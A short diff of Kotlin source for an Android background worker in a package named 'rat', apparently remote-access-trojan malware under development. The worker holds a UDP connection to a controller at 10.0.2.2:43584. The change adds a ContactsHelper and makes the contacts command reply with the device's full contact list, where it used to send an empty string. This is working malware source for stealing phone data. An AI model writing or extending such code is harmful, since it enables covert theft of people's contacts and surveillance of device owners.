@@ -7,6 +7,7 @@ import androidx.work.Worker
 import androidx.work.WorkerParameters
 import ru.awawa.rat.R
 import ru.awawa.rat.helper.BuildInfo
+import ru.awawa.rat.helper.ContactsHelper
 import ru.awawa.rat.helper.Preferences
 import ru.awawa.rat.worker.helper.State
 import ru.awawa.rat.worker.helper.protocol.*
@@ -31,8 +32,8 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
         this.state.connect(InetAddress.getByName("10.0.2.2"), 43584)
         socket.soTimeout = 1
 
-        val buffer = ByteArray(2048)
-        val rcvPacket = DatagramPacket(buffer, 2048)
+        val buffer = ByteArray(BUFFER_SIZE)
+        val rcvPacket = DatagramPacket(buffer, BUFFER_SIZE)
 
         mediaPlayer.start()
 
@@ -95,7 +96,8 @@ class BackgroundWorker(context: Context, workerParams: WorkerParameters):
                 val id = (packet as ContactsPacket).id
                 if (id != this.state.id) return
 
-                val pckt = ContactsPacket(id, "")
+                val contacts = ContactsHelper.getContacts(this.applicationContext)
+                val pckt = ContactsPacket(id, contacts)
                 this.socket.send(DatagramPacket(pckt.data, pckt.data.size, datagramPacket.address, datagramPacket.port))
             }
         }
